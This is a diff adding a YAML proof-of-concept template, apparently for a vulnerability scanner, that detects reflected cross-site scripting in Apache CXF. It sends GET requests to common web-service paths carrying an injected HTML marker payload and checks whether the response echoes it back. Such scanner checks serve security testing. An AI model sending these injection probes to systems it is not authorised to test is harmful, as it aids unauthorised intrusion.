@@ -1,0 +1,26 @@
+id: poc-yaml-apache-cxf-xss
+info:
+  name: Apache CXF 跨站脚本漏洞
+  severity: medium
+  tags:
+  - xss
+  finger: cxf
+variables:
+  path: '/ws/
+
+    /webservice/
+
+    /services/
+
+    /service/'
+requests:
+- method: GET
+  path: '{{.path}}"><h1>8762</h1>/services'
+  expression: 'status_code == 200 &&
+
+    contains(body, "\"><h1>8762</h1>/services") &&
+
+    contains(content_type, "html")
+
+    '
+transport: http
